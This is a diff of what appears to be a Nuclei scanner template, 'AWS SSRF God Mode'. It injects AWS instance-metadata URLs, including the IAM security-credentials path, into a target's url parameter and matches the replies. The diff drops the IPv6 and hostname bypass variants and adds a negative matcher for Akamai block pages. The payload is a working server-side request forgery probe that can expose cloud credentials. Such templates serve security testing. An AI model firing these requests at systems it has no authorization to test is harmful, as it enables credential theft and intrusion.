@@ -1,28 +1,18 @@
 id: K70n0s510-ssrf-aws-godmode
 info:
-  name: AWS SSRF God Mode (All Endpoints)
+  name: AWS SSRF God Mode
   author: K70n0s510
   severity: critical
-  description: Hammers all known AWS metadata endpoints.
   tags: ssrf,aws,cloud
 http:
   - method: GET
     path:
       - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
-      - "{{BaseURL}}/?url=http://169.254.169.254/latest/user-data/"
       - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-      - "{{BaseURL}}/?url=http://[fd00:ec2::254]/latest/meta-data/"  # IPv6 Bypass
-      - "{{BaseURL}}/?dest=http://instance-data/latest/meta-data/"   # Hostname variant
-
-    matchers-condition: or
+    matchers-condition: and
     matchers:
       - type: word
-        words: ["ami-id"]
+        words: ["ami-id", "instance-id"]
       - type: word
-        words: ["instance-id"]
-      - type: word
-        words: ["reservation-id"]
-      - type: word
-        words: ["security-credentials"]
-      - type: word
-        words: ["public-ipv4"]
+        words: ["AkamaiGHost", "Access Denied"]
+        negative: true
